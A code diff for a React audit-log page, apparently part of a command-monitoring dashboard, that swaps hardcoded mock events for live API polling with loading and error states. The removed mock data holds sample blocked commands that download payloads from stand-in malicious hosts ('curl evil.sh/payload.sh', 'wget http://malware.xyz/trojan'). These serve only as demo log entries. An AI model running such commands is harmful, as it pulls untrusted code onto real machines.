@@ -2,39 +2,60 @@ import { useState, useMemo } from 'react';
 import { AuditEvent } from '../types';
 import EventItem from '../components/EventItem';
 import BottomSheet from '../components/BottomSheet';
-
-const mockEvents: AuditEvent[] = [
-  { id: '1', type: 'denied', message: 'Blocked: curl evil.sh/payload.sh', timestamp: new Date().toISOString(), user: 'guest', agent: 'staging-01', details: 'Network rule: no outbound to unknown hosts' },
-  { id: '2', type: 'approved', message: 'Approved: sudo systemctl reload nginx', timestamp: new Date(Date.now() - 120000).toISOString(), user: 'ops', agent: 'prod-web-02' },
-  { id: '3', type: 'command', message: 'kubectl get pods -n production', timestamp: new Date(Date.now() - 300000).toISOString(), user: 'admin', agent: 'prod-k8s-01' },
-  { id: '4', type: 'alert', message: 'Suspicious: chmod +x /tmp/binary', timestamp: new Date(Date.now() - 600000).toISOString(), user: 'deploy', agent: 'prod-web-02', details: 'File not in allowlist, elevated permissions' },
-  { id: '5', type: 'approved', message: 'Approved: docker restart app', timestamp: new Date(Date.now() - 900000).toISOString(), user: 'devops', agent: 'prod-k8s-01' },
-  { id: '6', type: 'command', message: 'df -h', timestamp: new Date(Date.now() - 1200000).toISOString(), user: 'ops', agent: 'prod-db-01' },
-  { id: '7', type: 'agent_join', message: 'dev-laptop connected', timestamp: new Date(Date.now() - 1800000).toISOString(), agent: 'dev-laptop' },
-  { id: '8', type: 'policy_change', message: 'Network policy updated: block port 22 from 10.0.3.0/24', timestamp: new Date(Date.now() - 3600000).toISOString() },
-  { id: '9', type: 'denied', message: 'Blocked: wget http://malware.xyz/trojan', timestamp: new Date(Date.now() - 7200000).toISOString(), user: 'guest', agent: 'staging-01' },
-  { id: '10', type: 'agent_leave', message: 'ci-runner-03 disconnected', timestamp: new Date(Date.now() - 14400000).toISOString(), agent: 'ci-runner-03' },
-];
+import { api } from '../api/client';
+import { useApi } from '../hooks/useApi';
 
 const filters = ['all', 'denied', 'approved', 'alerts'] as const;
 type Filter = typeof filters[number];
 
 export default function Audit() {
+  const { data, loading, error, refresh } = useApi(() => api.getAuditEvents(), { pollMs: 15000 });
   const [filter, setFilter] = useState<Filter>('all');
   const [search, setSearch] = useState('');
   const [selected, setSelected] = useState<AuditEvent | null>(null);
 
+  const events: AuditEvent[] = useMemo(() => (data || []).map((e: any, i: number) => ({
+    id: e.id || String(i),
+    type: e.type || 'command',
+    message: e.message || e.command || e.action || 'Unknown event',
+    timestamp: e.timestamp || e.created_at || new Date().toISOString(),
+    user: e.user || e.username,
+    agent: e.agent || e.hostname || e.agent_id,
+    details: e.details,
+  })), [data]);
+
   const filtered = useMemo(() => {
-    let events = mockEvents;
-    if (filter === 'denied') events = events.filter(e => e.type === 'denied');
-    else if (filter === 'approved') events = events.filter(e => e.type === 'approved');
-    else if (filter === 'alerts') events = events.filter(e => e.type === 'alert');
+    let evts = events;
+    if (filter === 'denied') evts = evts.filter(e => e.type === 'denied');
+    else if (filter === 'approved') evts = evts.filter(e => e.type === 'approved');
+    else if (filter === 'alerts') evts = evts.filter(e => e.type === 'alert');
     if (search) {
       const q = search.toLowerCase();
-      events = events.filter(e => e.message.toLowerCase().includes(q) || (e.user?.toLowerCase().includes(q)) || (e.agent?.toLowerCase().includes(q)));
+      evts = evts.filter(e => e.message.toLowerCase().includes(q) || (e.user?.toLowerCase().includes(q)) || (e.agent?.toLowerCase().includes(q)));
     }
-    return events;
-  }, [filter, search]);
+    return evts;
+  }, [events, filter, search]);
+
+  if (loading) {
+    return (
+      <div className="flex flex-col items-center justify-center py-20">
+        <div className="w-8 h-8 border-2 border-tg-button border-t-transparent rounded-full animate-spin" />
+        <p className="text-sm text-tg-hint mt-3">Loading audit log...</p>
+      </div>
+    );
+  }
+
+  if (error) {
+    return (
+      <div className="flex flex-col items-center justify-center py-20">
+        <span className="text-3xl block mb-3">⚠️</span>
+        <p className="text-sm text-tg-danger mb-1">{error}</p>
+        <button onClick={refresh} className="mt-2 px-4 py-2 rounded-xl bg-tg-button text-tg-button-text text-sm font-medium">
+          Retry
+        </button>
+      </div>
+    );
+  }
 
   return (
     <div className="px-4 pt-4">
